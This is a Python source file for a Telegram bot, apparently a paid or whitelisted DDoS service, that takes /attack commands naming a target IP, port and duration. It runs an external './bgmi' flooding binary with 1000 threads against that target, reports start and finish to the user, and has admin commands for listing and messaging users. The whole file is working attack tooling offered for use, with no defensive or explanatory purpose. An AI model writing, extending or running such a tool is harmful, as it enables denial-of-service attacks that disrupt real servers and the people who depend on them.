import subprocess
import json
import os
import datetime
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
DEFAULT_THREADS = 1000
DEFAULT_PACKET = 9

users = {}
user_processes = {}  # Dictionary to track processes for each user

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_processes
    user_id = str(update.message.from_user.id)

    if user_id not in users:
        await update.message.reply_text("\u274c Unauthorized access. Please contact the admin.")
        return

    if len(context.args) != 4:
        await update.message.reply_text('Usage: /attack <target_ip> <port> <duration> <sid>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = int(context.args[2])  # Convert duration to an integer (seconds)
    packet = context.args[3]

    if user_id in user_processes and user_processes[user_id].poll() is None:
        await update.message.reply_text("\u26a0\ufe0f An attack is already running. Please wait for it to finish.")
        return

    flooding_command = ['./bgmi', target_ip, port, str(duration), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]

    # Start the flooding process for the user
    process = subprocess.Popen(flooding_command)
    user_processes[user_id] = process

    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')

    # Wait for the specified duration asynchronously
    await asyncio.sleep(duration)

    # Terminate the flooding process after the duration
    process.terminate()
    del user_processes[user_id]

    await update.message.reply_text(f'Flooding attack finished: {target_ip}:{port}. Attack ran for {duration} seconds.')

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id})\n"
                except Exception:
                    response += f"- User ID: {user_id}\n"
        else:
            response = "No data found."
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('Usage: /broadcast <message>')
            return

        for user in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user), text=message)
            except Exception as e:
                print(f"Error sending message to {user}: {e}")
        response = "Message sent to all users."
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = (
        f"Welcome to the Flooding Bot by @{OWNER_USERNAME}! Here are the available commands:\n\n"
        "Admin Commands:\n"
        "/allusers - Show all authorized users.\n"
        "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
        "User Commands:\n"
        "/attack <target_ip> <port> <duration> <sid> - Start a flooding attack.\n"
    )
    await update.message.reply_text(response)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("help", help_command))

    global users
    users = load_users()
    application.run_polling()

if __name__ == '__main__':
    main()
